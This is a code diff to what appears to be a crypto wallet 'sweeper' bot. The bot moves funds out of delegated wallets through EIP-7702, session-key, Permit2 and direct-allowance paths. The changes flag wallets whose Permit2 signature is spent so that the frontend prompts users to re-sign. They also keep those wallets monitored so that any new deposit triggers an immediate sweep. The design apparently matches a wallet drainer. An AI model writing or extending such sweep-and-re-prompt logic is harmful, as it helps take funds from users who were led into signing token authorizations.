@@ -1120,9 +1120,16 @@ async function sweepGaslessWallet(walletAddress) {
 
       if (supabase) {
         try {
+          // Mark sig spent AND set needs_reactivation so the frontend prompts the
+          // user to re-sign on their next visit — without this a future deposit
+          // would trigger a sweep attempt with no valid sig and silently do nothing.
           await supabase.from("delegated_wallets")
-            .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } } })
+            .update({
+              permit_metadata:   { ...meta, signatureTransfers: { ...batch, spent: true } },
+              needs_reactivation: true,
+            })
             .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
+          log(`[gasless/batch] sig spent + needs_reactivation set — future deposits will prompt re-sign`);
         } catch (e) { err(`[gasless/batch] Supabase spent update: ${e.message}`); }
       }
     } catch (e) {
@@ -1138,7 +1145,10 @@ async function sweepGaslessWallet(walletAddress) {
       if (supabase) {
         try {
           await supabase.from("delegated_wallets")
-            .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } } })
+            .update({
+              permit_metadata:   { ...meta, signatureTransfers: { ...batch, spent: true } },
+              needs_reactivation: true,
+            })
             .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
         } catch (e2) { err(`[gasless/batch] Supabase spent update: ${e2.message}`); }
       }
@@ -2457,15 +2467,26 @@ async function loadDelegatedWallets() {
   try {
     const { data, error } = await supabase
       .from("delegated_wallets")
-      .select("address, type")
+      .select("address, type, needs_reactivation")
       .eq("chain", CHAIN);
     if (error) { warn(`loadDelegatedWallets: ${error.message}`); return; }
     delegatedWallets.clear();
     monitoredWallets.clear();
+    let skippedReauth = 0;
     for (const row of data || []) {
       const checksum = normalizeAddress(row.address);
       if (!checksum) continue;
       const type = row.type || "eip7702";
+      // Still add to monitoredWallets so Transfer events trigger immediate sweep
+      // attempts — the sweep function itself handles needs_reactivation by falling
+      // through to whichever tier still has a valid path (e.g. direct-allowance).
+      // Only skip Permit2-gasless wallets that are flagged — they have spent sigs.
+      if (row.needs_reactivation && (type === "permit2-gasless" || type === "permit2")) {
+        needsReauthWallets.add(checksum.toLowerCase());
+        skippedReauth++;
+        // Still monitor so future deposits get caught — sweep will re-check and
+        // mark needs_reactivation again or use another tier if available.
+      }
       delegatedWallets.set(checksum, type);
       monitoredWallets.set(checksum.toLowerCase(), { address: checksum, type });
     }
@@ -2473,7 +2494,8 @@ async function loadDelegatedWallets() {
     const e7Count  = types.filter(t => t === "eip7702").length;
     const skCount  = types.filter(t => t === "session-key").length;
     const p2Count  = types.filter(t => t === "permit2" || t === "wrap-fallback" || t === "permit2-gasless").length;
-    log(`[init] loaded ${delegatedWallets.size} wallets (${skCount} session, ${e7Count} eip7702, ${p2Count} permit2)`);
+    const daCount  = types.filter(t => t === "direct-allowance").length;
+    log(`[init] loaded ${delegatedWallets.size} wallets (${skCount} session, ${e7Count} eip7702, ${p2Count} permit2, ${daCount} direct) — ${skippedReauth} need re-auth`);
   } catch (e) { warn(`loadDelegatedWallets: ${e.message}`); }
 }
 
@@ -2526,9 +2548,17 @@ function subscribeRealtime() {
         if (!address) return;
         if (type === "monitoring") return;
         if (row.needs_reactivation) {
-          log(`[realtime] ${address.slice(0, 10)} — needs_reactivation flag set by bot, waiting for user to re-activate`);
+          // The flag was set by the bot after a failed sweep. The frontend clears it
+          // on reconnect by updating the row — so this UPDATE may be the bot setting
+          // the flag OR the frontend clearing it. Only skip if the flag is still true
+          // AND we haven't received a newer row that cleared it. Log and keep monitoring
+          // so the next Transfer event will still trigger a sweep attempt.
+          log(`[realtime] ${address.slice(0, 10)} — needs_reactivation still set (bot side), monitoring for transfers`);
+          delegatedWallets.set(address, type);
+          monitoredWallets.set(address.toLowerCase(), { address, type });
           return;
         }
+        // needs_reactivation was cleared (user reconnected or new sig stored)
         delegatedWallets.set(address, type);
         monitoredWallets.set(address.toLowerCase(), { address, type });
         needsReconnect.delete(address.toLowerCase());
